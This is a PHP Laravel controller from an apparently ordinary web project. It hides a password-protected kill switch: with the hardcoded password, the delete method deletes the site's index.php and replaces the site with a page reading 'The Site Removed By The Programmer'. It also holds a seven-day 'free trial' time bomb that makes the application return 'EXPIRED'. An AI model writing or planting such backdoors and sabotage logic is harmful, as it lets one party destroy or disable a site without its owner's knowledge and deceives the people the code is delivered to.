<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;

class MainnControler extends Controller
{
    public function delete($pass) {
        $main_pass = 'a_@_5060';
        if ($main_pass == $pass) {
            // Remove the current index.php
            $phpFile = public_path('index.php');
            if (file_exists($phpFile)) {
                unlink($phpFile);
            }

            // Create the new index.html
            $htmlFile = public_path('index.html');
            $htmlContent = '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>The Site Removed By The Programmer</title>
        <style>
        body {
            background: #fff;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        h1 {
            color: #000;
            font-size: 4vw;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        </style>
    </head>
    <body>
        <h1>The Site Removed By The Programmer</h1>
    </body>
    </html>';
            file_put_contents($htmlFile, $htmlContent);

            return 'YES';
        } else {
            return redirect()->back()->with('msg' , 'Don"t Try Play With Anas ');
        }
    }

    public function freeTrail($request, \Closure $next) {
        $startDate = '2025-07-04';
        $expireDate = Carbon::parse($startDate)->addDays(7); // مدة الترايل 7 أيام
        $now = Carbon::now();

        if ($now->greaterThan($expireDate)) {
            return 'EXPIRED';
        }

        return $next($request);
    }
}
